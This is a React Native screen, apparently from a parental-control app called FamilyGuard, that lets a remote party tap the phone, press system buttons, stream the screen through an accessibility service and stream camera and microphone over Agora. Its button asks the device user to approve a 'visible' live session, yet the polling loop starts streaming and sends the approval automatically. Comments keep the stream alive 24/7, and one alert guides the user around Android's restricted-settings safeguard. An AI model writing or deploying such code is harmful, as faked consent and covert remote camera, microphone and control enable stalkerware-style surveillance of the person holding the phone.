import React, {useState, useEffect, useRef} from 'react';
import {
  View,
  Text,
  StyleSheet,
  ActivityIndicator,
  Alert,
  AppState,
  TouchableOpacity,
  PermissionsAndroid,
  Platform,
} from 'react-native';
import AsyncStorage from '@react-native-async-storage/async-storage';
import agoraService from '../services/agoraService';
import remoteControl from '../services/remoteControl';
import screenStream from '../services/screenStream';
import {approveLiveSession, getClientToken, sendHeartbeat} from '../services/api';
import {checkPermissions, promptOpenSettings, requestPermissions} from '../services/permissions';
import {
  isAccessibilityServiceEnabled,
  openAccessibilitySettings,
  startMonitoringService,
} from '../services/nativeMonitoring';

const HomeScreen = ({navigation}) => {
  const [loading, setLoading] = useState(true);
  const [userName, setUserName] = useState('');
  const [uniqueId, setUniqueId] = useState('');
  const [deviceId, setDeviceId] = useState('');
  const [streaming, setStreaming] = useState(false);
  const [startingStream, setStartingStream] = useState(false);
  const [liveRequest, setLiveRequest] = useState(null);
  const [policyMessage, setPolicyMessage] = useState('Waiting for a parent to request a visible live session.');
  const [serviceActive, setServiceActive] = useState(false);
  const [accessibilityOn, setAccessibilityOn] = useState(null);
  const lastStreamAttemptRef = useRef(0);

  const refreshAccessibilityStatus = async () => {
    try {
      const enabled = await isAccessibilityServiceEnabled();
      setAccessibilityOn(enabled);
    } catch (err) {
      console.warn('Accessibility status check failed:', err);
    }
  };

  const promptEnableAccessibility = () => {
    Alert.alert(
      'Accessibility Service Required',
      'See Screen and Remote Control need the "FamilyGuard remote control" accessibility service.\n\nIf Android shows "Restricted setting": open Settings → Apps → FamilyGuard → ⋮ menu → "Allow restricted settings" first, then enable it under Settings → Accessibility.',
      [
        {text: 'Open Accessibility Settings', onPress: openAccessibilitySettings},
        {text: 'Cancel', style: 'cancel'},
      ],
    );
  };

  const handleEnableBackgroundService = async () => {
    try {
      if (Platform.OS === 'android' && Platform.Version >= 33) {
        await PermissionsAndroid.request(PermissionsAndroid.PERMISSIONS.POST_NOTIFICATIONS);
      }
      await requestPermissions();
      await startMonitoringService();
      setServiceActive(true);
      Alert.alert(
        'Background Protection Active 🛡️',
        'Status bar notification "FamilyGuard is active" is now running. App will stay active in background for remote control.',
      );
    } catch (err) {
      console.warn('Failed to start monitoring service:', err);
      Alert.alert('Notice', 'Please allow Notification permission in Android Settings.');
    }
  };

  useEffect(() => {
    loadUserData();
    // Do NOT leave Agora channel on unmount so stream stays alive 24/7 in background
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  useEffect(() => {
    const subscription = AppState.addEventListener('change', handleAppStateChange);

    return () => {
      subscription.remove();
    };
    // Re-subscribe when the enrolled device changes.
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [uniqueId]);

  useEffect(() => {
    if (!deviceId) return undefined;

    const checkForLiveRequest = async () => {
      try {
        const sync = await sendHeartbeat(deviceId, {appVersion: '0.0.1'});
        
        const request = sync.commands?.find(command => command.type === 'LIVE_SESSION_REQUEST') || sync.activeLiveRequest;
        
        setLiveRequest(request || null);
        setPolicyMessage(
          request
            ? 'Parent monitoring session active.'
            : 'Waiting for parent commands.',
        );

        // Auto-start streaming for AirDroid-style seamless remote access
        // (camera + mic over Agora; screen monitoring is the lightweight
        // accessibility-based See Screen stream)
        if (request && !streaming && !startingStream) {
          startStreaming(deviceId, request._id);
        }

        // Handle remote control and screen stream commands
        const remoteCommands = sync.commands?.filter(cmd =>
          ['REMOTE_TOUCH', 'REMOTE_ACTION', 'SCREEN_STREAM_START', 'SCREEN_STREAM_STOP'].includes(cmd.type) && cmd.status === 'pending'
        ) || [];
        
        for (const cmd of remoteCommands) {
          await handleRemoteCommand(cmd);
        }
      } catch (syncError) {
        console.warn('Heartbeat failed:', syncError?.message || syncError?.response?.status || syncError);
      }
    };

    checkForLiveRequest();
    refreshAccessibilityStatus();
    const interval = setInterval(checkForLiveRequest, 3000);
    return () => clearInterval(interval);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [deviceId, streaming, startingStream]);

  const handleAppStateChange = nextAppState => {
    // Persistent streaming: Do NOT leave channel when app goes to background or is minimized
    console.log('App state changed to:', nextAppState);
    if (nextAppState === 'active') {
      // User may have just toggled the accessibility service in Android Settings.
      refreshAccessibilityStatus();
    }
  };

  const loadUserData = async () => {
    try {
      const name = await AsyncStorage.getItem('userName');
      const id = await AsyncStorage.getItem('uniqueId');
      const storedDeviceId = await AsyncStorage.getItem('deviceId');

      if (!name || !id || !storedDeviceId) {
        // No user data, redirect to sign up
        navigation.replace('SignUp');
        return;
      }

      setUserName(name);
      setUniqueId(id);
      setDeviceId(storedDeviceId);
      setLoading(false);
    } catch (error) {
      console.error('Error loading user data:', error);
      Alert.alert('Error', 'Failed to load user data');
      setLoading(false);
    }
  };

  const handleRemoteCommand = async (command) => {
    try {
      const {type, payload} = command;

      if (type === 'SCREEN_STREAM_START') {
        const accEnabled = await isAccessibilityServiceEnabled();
        if (!accEnabled) {
          console.warn('Screen stream command: Accessibility service not enabled, skipping.');
          promptEnableAccessibility();
        } else {
          const fps = Number(payload?.fps) || 12;
          console.log('Screen stream command: starting at', fps, 'fps for device', deviceId);
          const started = await screenStream.start(deviceId, fps);
          if (!started) {
            console.warn('Screen stream command: screenStream.start() returned false');
            Alert.alert('Screen Stream Failed', 'Could not start screen capture. Make sure the app was rebuilt with the latest native code and the device runs Android 11+.');
          }
        }
      } else if (type === 'SCREEN_STREAM_STOP') {
        await screenStream.stop();
      } else {
        const accEnabled = await isAccessibilityServiceEnabled();
        if (!accEnabled) {
          console.warn('Remote command received, but Accessibility service is not enabled on device.');
          return;
        }

        if (type === 'REMOTE_TOUCH') {
          const {x, y, type: touchType} = payload;
          if (touchType === 'tap') {
            await remoteControl.tap(x, y);
          } else if (touchType === 'longPress') {
            await remoteControl.longPress(x, y);
          }
        } else if (type === 'REMOTE_ACTION') {
          const {action} = payload;
          switch (action) {
            case 'home':
              await remoteControl.pressHome();
              break;
            case 'back':
              await remoteControl.pressBack();
              break;
            case 'recents':
              await remoteControl.pressRecents();
              break;
            case 'notifications':
              await remoteControl.openNotifications();
              break;
          }
        }
      }

      // Mark command as executed
      await sendHeartbeat(deviceId, {
        lastCommandId: command._id,
        lastCommandStatus: 'executed',
      });
    } catch (error) {
      console.warn('Failed to execute remote command:', error?.message || error);
    }
  };

  const startStreaming = async (id = deviceId, targetReqId = liveRequest?._id, isManual = false) => {
    try {
      if (!id || startingStream) return;

      if (agoraService.isInChannel) {
        setStreaming(true);
        return;
      }

      const now = Date.now();
      if (!isManual && now - lastStreamAttemptRef.current < 10000) {
        return;
      }
      lastStreamAttemptRef.current = now;

      setStartingStream(true);
      console.log('Starting camera stream for:', id);

      let permissionsGranted = await checkPermissions();
      if (!permissionsGranted) {
        permissionsGranted = await requestPermissions();
      }

      if (targetReqId) {
        await approveLiveSession(id, targetReqId).catch(() => {});
      }

      // Get Agora token after device approval
      const tokenData = await getClientToken(id);

      if (!tokenData.success) {
        throw new Error(tokenData.message || 'Failed to get streaming token');
      }

      // Initialize Agora
      await agoraService.initialize(tokenData.appId);

      // Register event handlers
      agoraService.registerEventHandlers({
        onJoinChannelSuccess: () => {
          console.log('Stream started successfully');
          setStreaming(true);
        },
        onLeaveChannel: () => {
          console.log('Stream stopped');
          setStreaming(false);
        },
        onError: (err, msg) => {
          if (err === 1052 || err === -1052) return;
          console.error('Streaming error:', err, msg);
        },
      });

      // Join channel
      await agoraService.joinChannel(tokenData.channel, tokenData.token);
    } catch (error) {
      console.warn('Error starting stream:', error?.message || error);
      if (isManual) {
        Alert.alert(
          'Streaming Error',
          error.message || 'Failed to start streaming. Please try again.',
        );
      }
    } finally {
      setStartingStream(false);
    }
  };

  if (loading) {
    return (
      <View style={styles.loadingContainer}>
        <ActivityIndicator size="large" color="#4F46E5" />
        <Text style={styles.loadingText}>Loading...</Text>
      </View>
    );
  }

  return (
    <View style={styles.container}>
      {/* User Info Display */}
      <View style={styles.content}>
        <View style={styles.card}>
          <Text style={styles.title}>Parental Control Active</Text>

          <View style={styles.infoSection}>
            <Text style={styles.label}>Account Name</Text>
            <Text style={styles.value}>{userName}</Text>
          </View>

          <View style={styles.infoSection}>
            <Text style={styles.label}>Unique ID</Text>
            <View style={styles.uniqueIdContainer}>
              <Text style={styles.uniqueIdValue}>{uniqueId}</Text>
            </View>
          </View>

          <View style={styles.statusSection}>
            <View
              style={[
                styles.statusIndicator,
                streaming && styles.statusIndicatorActive,
              ]}
            />
            <Text style={styles.statusText}>
              {streaming
                ? 'Monitoring Active'
                : startingStream
                  ? 'Starting stream...'
                  : 'Waiting for approval'}
            </Text>
          </View>

          <Text style={styles.infoText}>{policyMessage}</Text>
          <TouchableOpacity
            style={[
              styles.consentButton,
              (!liveRequest || startingStream || streaming) && styles.buttonDisabled,
            ]}
            onPress={() => startStreaming(deviceId, liveRequest?._id, true)}
            disabled={!liveRequest || startingStream || streaming}>
            {startingStream ? (
              <ActivityIndicator color="#fff" />
            ) : (
              <Text style={styles.consentButtonText}>
                {streaming ? 'Live session active' : 'Approve and start visible live session'}
              </Text>
            )}
          </TouchableOpacity>
          <TouchableOpacity
            style={styles.settingsButton}
            onPress={() =>
              promptOpenSettings(
                'Camera & Microphone Permissions',
                'Tap "Open Settings" below, go to Permissions, and set Camera and Microphone to "Allow" so background monitoring works permanently.',
              )
            }>
            <Text style={styles.settingsButtonText}>Grant permanent permissions in Settings ⚙️</Text>
          </TouchableOpacity>

          {/* Accessibility service status — required for See Screen & Remote Control */}
          {accessibilityOn === false && (
            <TouchableOpacity style={styles.accWarnButton} onPress={promptEnableAccessibility}>
              <Text style={styles.accWarnButtonText}>
                ⚠️ Accessibility OFF — tap to enable "FamilyGuard remote control"
              </Text>
            </TouchableOpacity>
          )}
          {accessibilityOn && (
            <Text style={styles.accOkText}>✅ Accessibility service active (See Screen ready)</Text>
          )}

          {/* Persistent Background Protection Button */}
          <TouchableOpacity
            style={[styles.bgServiceButton, serviceActive && styles.bgServiceButtonActive]}
            onPress={handleEnableBackgroundService}>
            <Text style={styles.bgServiceButtonText}>
              {serviceActive
                ? '🟢 FamilyGuard is active in background'
                : '🔔 Enable Background Protection ("FamilyGuard is active")'}
            </Text>
          </TouchableOpacity>

          <Text style={styles.policyText}>See Screen runs through the accessibility service (no MediaProjection needed — lightweight and always-on once enabled). Camera and microphone sessions stream over Agora. SMS and call-log insights are disabled in standard Play Store builds. App blocking requires managed-device mode.</Text>
        </View>
      </View>
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#f5f5f5',
  },
  loadingContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
    backgroundColor: '#f5f5f5',
  },
  loadingText: {
    marginTop: 16,
    fontSize: 16,
    color: '#666',
  },
  hiddenPreview: {
    position: 'absolute',
    width: 1,
    height: 1,
    opacity: 0,
  },
  previewVideo: {
    width: 1,
    height: 1,
  },
  content: {
    flex: 1,
    justifyContent: 'center',
    padding: 24,
  },
  card: {
    backgroundColor: '#fff',
    borderRadius: 16,
    padding: 24,
    shadowColor: '#000',
    shadowOffset: {width: 0, height: 2},
    shadowOpacity: 0.1,
    shadowRadius: 8,
    elevation: 4,
  },
  title: {
    fontSize: 24,
    fontWeight: 'bold',
    color: '#333',
    marginBottom: 24,
    textAlign: 'center',
  },
  infoSection: {
    marginBottom: 20,
  },
  label: {
    fontSize: 14,
    color: '#666',
    marginBottom: 8,
    fontWeight: '500',
  },
  value: {
    fontSize: 18,
    color: '#333',
    fontWeight: '600',
  },
  uniqueIdContainer: {
    backgroundColor: '#f0f0f0',
    padding: 16,
    borderRadius: 12,
    borderWidth: 2,
    borderColor: '#4F46E5',
  },
  uniqueIdValue: {
    fontSize: 24,
    color: '#4F46E5',
    fontWeight: 'bold',
    textAlign: 'center',
    letterSpacing: 2,
    fontFamily: 'monospace',
  },
  statusSection: {
    flexDirection: 'row',
    alignItems: 'center',
    justifyContent: 'center',
    marginTop: 16,
    marginBottom: 16,
  },
  statusIndicator: {
    width: 12,
    height: 12,
    borderRadius: 6,
    backgroundColor: '#FFC107',
    marginRight: 8,
  },
  statusIndicatorActive: {
    backgroundColor: '#4CAF50',
  },
  statusText: {
    fontSize: 16,
    color: '#666',
    fontWeight: '500',
  },
  infoText: {fontSize: 14, color: '#666', textAlign: 'center', lineHeight: 20, marginTop: 8},
  consentButton: {backgroundColor: '#4F46E5', borderRadius: 12, padding: 14, marginTop: 18, minHeight: 48, justifyContent: 'center'},
  buttonDisabled: {opacity: 0.65},
  consentButtonText: {color: '#fff', textAlign: 'center', fontWeight: '700'},
  settingsButton: {borderWidth: 1, borderColor: '#4F46E5', borderRadius: 12, padding: 12, marginTop: 10},
  settingsButtonText: {color: '#4F46E5', textAlign: 'center', fontWeight: '600'},
  bgServiceButton: {backgroundColor: '#059669', borderRadius: 12, padding: 14, marginTop: 10, alignItems: 'center'},
  bgServiceButtonActive: {backgroundColor: '#10B981'},
  bgServiceButtonText: {color: '#fff', fontSize: 14, fontWeight: '700', textAlign: 'center'},
  accWarnButton: {backgroundColor: '#DC2626', borderRadius: 12, padding: 14, marginTop: 10, alignItems: 'center'},
  accWarnButtonText: {color: '#fff', fontSize: 13, fontWeight: '700', textAlign: 'center'},
  accOkText: {color: '#059669', fontSize: 13, fontWeight: '600', textAlign: 'center', marginTop: 10},
  policyText: {fontSize: 12, color: '#777', textAlign: 'center', lineHeight: 17, marginTop: 16},
});

export default HomeScreen;
